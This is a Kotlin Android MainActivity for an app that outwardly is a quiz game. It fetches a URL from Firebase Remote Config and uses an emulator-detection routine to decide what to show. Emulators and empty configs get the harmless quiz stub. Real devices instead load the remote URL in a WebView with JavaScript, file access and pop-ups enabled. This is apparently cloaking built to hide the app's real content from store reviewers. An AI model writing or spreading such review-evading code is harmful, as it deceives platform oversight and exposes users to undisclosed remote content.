package piulimk.prezinip.main_page.presentation

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import dagger.hilt.android.AndroidEntryPoint
import piulimk.prezinip.R
import piulimk.prezinip.databinding.ActivityMainBinding
import java.util.*

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {
    private val viewModel: MainViewModel by viewModels()

    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding

    private lateinit var webView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding?.root)
        var totalScore = 0
        webView = findViewById(R.id.webView)

        viewModel.hasLink()

        viewModel.hasLinkLiveData.observe(this) {

            if (it == true) {
                viewModel.getUrl()
            } else {
                try {
                    val file = FirebaseRemoteConfig.getInstance()
                    val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
                    val configSettings = remoteConfigSettings {
                        minimumFetchIntervalInSeconds = 3600
                    }
                    remoteConfig.setConfigSettingsAsync(configSettings)
                    remoteConfig.fetchAndActivate()
                        .addOnCompleteListener { task ->
                            if (task.isSuccessful) {
                                task.result
                                val url = file.getString("url")

                                Log.e("Tag", "url = $url ${url.isEmpty()}  emu = ${checkIsEmu()}")
                                if (url.isEmpty() || checkIsEmu()) {
                                    _binding?.goneAll()
                                    viewModel.startStub(this)
                                } else {
                                    try {
                                        viewModel.saveLink(url)
                                        startWebView(webView = webView, savedInstanceState, url, _binding!!)
//                                        _binding?.showWebView()
                                    } catch(e: Exception) {
                                        _binding?.showError(this)
                                    }
                                }
                            } else {
                                _binding?.showError(this)
                            }
                        }

                } catch (e: Exception) {
                    _binding?.showError(this)
                }

            }

            viewModel.linkLiveData.observe(this) { url ->
                val connectionManager: ConnectivityManager =
                    this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val activeNetwork: NetworkInfo? = connectionManager.activeNetworkInfo
                val isConnected = activeNetwork?.isConnectedOrConnecting == true

                if (isConnected) {
                    try {
                        startWebView(webView, savedInstanceState, url.toString(), _binding!!)
//                        _binding?.showWebView()
                    } catch(e: Exception) {
                        _binding?.showError(this)
                    }
                } else {
                    _binding?.showError(this)
                }
            }

            viewModel.quizLiveData.observe(this) {
                binding?.startLayout?.visibility = View.VISIBLE
            }

            viewModel.questionLiveData.observe(this) { model ->
                binding?.totalScoreField?.text =
                    String.format(getString(R.string.current_score), totalScore.toString())
                binding?.question?.text = model?.question
                binding?.firstAnswer?.text = model?.variants?.get(0)
                binding?.secondAnswer?.text = model?.variants?.get(1)
                binding?.thirdAnswer?.text = model?.variants?.get(2)


                binding?.firstAnswer?.setOnClickListener {
                    if (binding?.firstAnswer!!.text == model?.correctAnswer) {
                        totalScore += 100
                        binding?.nextQuestion(model?.correctAnswer, totalScore, "+100", this)
                    } else {
                        totalScore -= 50
                        binding?.nextQuestion(model?.correctAnswer, totalScore, "-50", this)
                    }
                }

                binding?.secondAnswer?.setOnClickListener {
                    if (binding?.secondAnswer!!.text == model?.correctAnswer) {
                        totalScore += 100
                        binding?.nextQuestion(model?.correctAnswer, totalScore, "+100", this)
                    } else {
                        totalScore -= 50
                        binding?.nextQuestion(model?.correctAnswer, totalScore, "-50", this)
                    }
                }

                binding?.thirdAnswer?.setOnClickListener {
                    if (binding?.thirdAnswer!!.text == model?.correctAnswer) {
                        totalScore += 100
                        binding?.nextQuestion(model?.correctAnswer, totalScore, "+100", this)
                    } else {
                        totalScore -= 50
                        binding?.nextQuestion(model?.correctAnswer, totalScore, "-50", this)
                    }
                }
            }

            binding?.nextAnswer?.setOnClickListener {
                binding?.startGame(totalScore)
                viewModel.nextQuestion()
            }

            binding?.newGame?.setOnClickListener {
                totalScore = 0
                binding?.refreshGame(totalScore, this)
            }
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        binding?.webView?.saveState(outState)
        super.onSaveInstanceState(outState)
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)

        // Восстанавливаем состояние WebView после восстановления активности
        webView.restoreState(savedInstanceState)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        }
    }

}

private fun startWebView(webView: WebView, savedInstanceState: Bundle?, url: String, binding: ActivityMainBinding) {
    webView.webViewClient = WebViewClient()
    webView!!.webChromeClient = WebChromeClient()
    val webSettings = webView.settings
    webSettings.apply {
        javaScriptEnabled = true
        loadWithOverviewMode = true
        useWideViewPort = true
        domStorageEnabled = true
        databaseEnabled = true
        setSupportZoom(false)
        allowFileAccess = true
        allowContentAccess = true
    }
    if (savedInstanceState != null) webView.restoreState(savedInstanceState) else webView!!.loadUrl(
        url
    )

    webView!!.webViewClient = object : WebViewClient() {
        override fun onPageFinished(view: WebView?, url: String?) {
            binding.showWebView()
        }
    }

    webView!!.settings.apply {
        domStorageEnabled = true
        javaScriptCanOpenWindowsAutomatically = true
    }
}

private fun checkIsEmu(): Boolean {
//    if (BuildConfig.DEBUG) return false
    val phoneModel = Build.MODEL
    val buildProduct = Build.PRODUCT
    val buildHardware = Build.HARDWARE
    val brand = Build.BRAND
    var result = (Build.FINGERPRINT.startsWith("generic")
            || phoneModel.contains("google_sdk")
            || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
            || phoneModel.contains("Emulator")
            || phoneModel.contains("Android SDK built for x86")
            || Build.MANUFACTURER.contains("Genymotion")
            || buildHardware == "goldfish"
            || Build.BRAND.contains("google")
            || buildHardware == "vbox86"
            || buildProduct == "sdk"
            || buildProduct == "google_sdk"
            || buildProduct == "sdk_x86"
            || buildProduct == "vbox86p"
            || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
            || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
            || buildHardware.lowercase(Locale.getDefault()).contains("nox")
            || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
    if (result) return true
    result = result or (Build.BRAND.startsWith("generic") &&
            Build.DEVICE.startsWith("generic"))
    if (result) return true
    result = result or ("google_sdk" == buildProduct)
    return result
}